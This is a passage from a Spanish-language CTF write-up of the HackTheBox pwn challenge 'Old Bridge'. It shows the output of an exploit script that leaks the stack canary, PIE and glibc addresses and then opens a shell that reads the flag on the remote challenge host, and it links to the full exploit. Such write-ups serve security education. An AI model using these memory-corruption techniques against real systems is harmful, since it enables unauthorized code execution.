</code></pre></div><p>Y logramos obtener una <em>shell</em> localmente:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1234
[<span class="code-blue">*</span>] './oldbridge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Canary: 0x6f575195cffba600
[<span class="code-green">+</span>] Saved $rbp: 0x7ffe877c9aa0
[<span class="code-green">+</span>] Return address: 0x55e20e000ecf
[<span class="code-green">+</span>] ELF base address: 0x55e20e000000
[<span class="code-green">+</span>] Leaked write() address: 0x7f4b84af0090
[<span class="code-green">+</span>] Glibc base address: 0x7f4b849e2000
[<span class="code-blue">*</span>] Closed connection to 127.0.0.1 port 1234  
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
oldbridge
solve.py
</code></pre></div><p>Ahora necesitamos ejecutarlo de forma remota y encontrar la versión correcta de Glibc:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 167.71.139.192:31230
[<span class="code-blue">*</span>] './oldbridge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] XOR Canary: b"\r\x82\xee\x8dl'P\x8f"
[<span class="code-green">+</span>] XOR saved $rbp: b'\x1d>\xa8\xde\xf2r\r\r'
[<span class="code-green">+</span>] XOR return address: b'\xc2\xa3uE\xb3X\r\r'
[<span class="code-green">+</span>] Canary: 0x825d2a6180e38f00
[<span class="code-green">+</span>] Saved $rbp: 0x7fffd3a53310
[<span class="code-green">+</span>] Return address: 0x55be4878aecf
[<span class="code-green">+</span>] ELF base address: 0x55be4878a000
[<span class="code-green">+</span>] Leaked write() address: 0x7f8817920280
[<span class="code-green">+</span>] Glibc base address: 0x7f88178121f0
[<span class="code-blue">*</span>] Closed connection to 167.71.139.192 port 31230  
[<span class="code-blue">*</span>] Switching to interactive mode
[<span class="code-blue">*</span>] Got EOF while reading in interactive
<span class="code-red">$</span>
</code></pre></div><p>Podemos tomar los últimos tres dígitos hexadecimales de la dirección y buscar por <code>write</code> en <a href="https://libc.rip">https://libc.rip</a>:</p><p><img alt="Glibc version" src="/images/HTB-Challenges/HTB-Pwn-Old-Bridge-1.webp"></p><h2 id="_flag_"><em>Flag</em></h2><p>Finalmente, obtenemos que la última versión de la lista es la que usa la instancia remota. Simplemente actualizamos las cuatro <em>offsets</em> que necesitamos y ejecutamos el <em>exploit</em> nuevamente:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 167.71.139.192:31230
[<span class="code-blue">*</span>] './oldbridge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] XOR Canary: b"\r\x82\xee\x8dl'P\x8f"
[<span class="code-green">+</span>] XOR saved $rbp: b'\x1d>\xa8\xde\xf2r\r\r'
[<span class="code-green">+</span>] XOR return address: b'\xc2\xa3uE\xb3X\r\r'
[<span class="code-green">+</span>] Canary: 0x825d2a6180e38f00
[<span class="code-green">+</span>] Saved $rbp: 0x7fffd3a53310
[<span class="code-green">+</span>] Return address: 0x55be4878aecf
[<span class="code-green">+</span>] ELF base address: 0x55be4878a000
[<span class="code-green">+</span>] Leaked write() address: 0x7f8817920280
[<span class="code-green">+</span>] Glibc base address: 0x7f8817829000
[<span class="code-blue">*</span>] Closed connection to 167.71.139.192 port 31230  
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
core
flag.txt
oldbridge
<span class="code-red">$</span> cat flag.txt
HTB{q4i1q3_i1i3_p0a_a01}
</code></pre></div><p>El <em>exploit</em> completo se puede encontrar aquí: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Challenges/Pwn/Old%20Bridge/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#ingeniería-inversa">Ingeniería inversa</a><ul><li><a href="#vulnerabilidad-de-_buffer-overflow_">Vulnerabilidad de <em>Buffer Overflow</em></a></li></ul></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a><ul><li><a href="#ataque-de-fuerza-bruta">Ataque de fuerza bruta</a></li><li><a href="#_bypass_-de-pie"><em>Bypass</em> de PIE</a></li><li><a href="#_stack-pivot_"><em>Stack Pivot</em></a></li><li><a href="#fugando-direcciones-de-glibc">Fugando direcciones de Glibc</a></li><li><a href="#obteniendo-rce">Obteniendo RCE</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Recibe un resumen semanal del blog"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">Ver historial de resúmenes</a></p><p class="tc">impulsado por <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>